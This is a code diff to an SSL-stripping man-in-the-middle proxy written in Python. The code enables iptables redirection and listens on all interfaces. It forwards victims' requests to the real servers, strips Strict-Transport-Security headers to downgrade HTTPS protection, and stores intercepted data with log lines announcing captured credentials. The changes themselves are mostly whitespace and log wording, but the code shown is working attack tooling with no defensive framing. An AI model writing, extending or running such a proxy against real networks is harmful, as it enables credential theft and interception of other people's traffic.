@@ -25,7 +25,6 @@ def handle_client_connection(client_socket):
                     break
         except: pass
 
-
         # Connect to server
         if host:
             try:
@@ -41,7 +40,6 @@ def handle_client_connection(client_socket):
                 except: return 
 
             with secure_sock:
-
                 # Modify client request
                 mod_req = re.sub(rb'Accept-Encoding:.*?\r\n', b'', request_data)
                 mod_req = mod_req.replace(b'Connection: keep-alive', b'Connection: close')
@@ -57,7 +55,6 @@ def handle_client_connection(client_socket):
                         response_data += chunk
                     except socket.timeout: break
                     except: break
-
 
                 # Strip HTTPS enforcement
                 response_data = re.sub(rb'Strict-Transport-Security:.*?\r\n', b'', response_data, flags=re.IGNORECASE)
@@ -87,7 +84,7 @@ def handle_client_connection(client_socket):
                     STATUS["intercepted_data"].append(data_entry)
                     STATUS["all_intercepted_data"].append(data_entry)
                     
-                    log_msg(f"[ALERT] SSL STRIP Data Captured for {host}")
+                    log_msg(f"[DATA] CREDENTIALS CAPTURED: {host}")
 
                 client_socket.sendall(stripped_response)
 
@@ -103,10 +100,10 @@ def run_ssl_strip():
     try:
         server.bind(('0.0.0.0', SSL_STRIP_PORT))
         server.listen(50)
-        log_msg(f"[+] SSL Proxy listening on port {SSL_STRIP_PORT}")
-
+        
         # Enable iptables redirect (implemented in utils.set_port_forwarding)
         set_port_forwarding(True)
+        log_msg(f"[PROXY] SSL Proxy: LISTENING on port {SSL_STRIP_PORT}")
         
         while not STOP_EVENT.is_set():
             try:
@@ -115,7 +112,7 @@ def run_ssl_strip():
                 threading.Thread(target=handle_client_connection, args=(client,), daemon=True).start()
             except socket.timeout: continue
             except: pass
-    except Exception as e: log_msg(f"SSL ERROR: {e}")
+    except Exception as e: log_msg(f"[!] SSL ERROR: {e}")
     finally:
          # Always clean up iptables and socket
         set_port_forwarding(False)
